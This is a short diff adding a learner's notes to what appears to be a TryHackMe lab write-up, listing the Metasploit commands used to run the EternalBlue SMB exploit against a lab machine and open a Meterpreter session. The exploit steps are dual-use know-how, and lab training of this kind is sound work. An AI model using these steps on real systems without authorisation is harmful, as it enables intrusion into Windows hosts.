@@ -134,3 +134,11 @@ unset PAYLOAD
 
 What command do you use to proceed with the exploitation phase?
 exploit
+
+On TryHackMe's attack box / virtual machine I successfully:
+- Accessed Metaspolit using "msfconsole"
+- Loaded up the exploit module with "use exploit/windows/smb/ms17_010_eternalblue"
+- Set the RHOST parameter to the virtual machine I was attacking with "setg rhosts 10.10.165.39"
+- Executed the exploit with the command "run"
+
+Metasploit then used a scanner to check for vulnerabilities, found one and established a connection back to me with a Meterpreter session
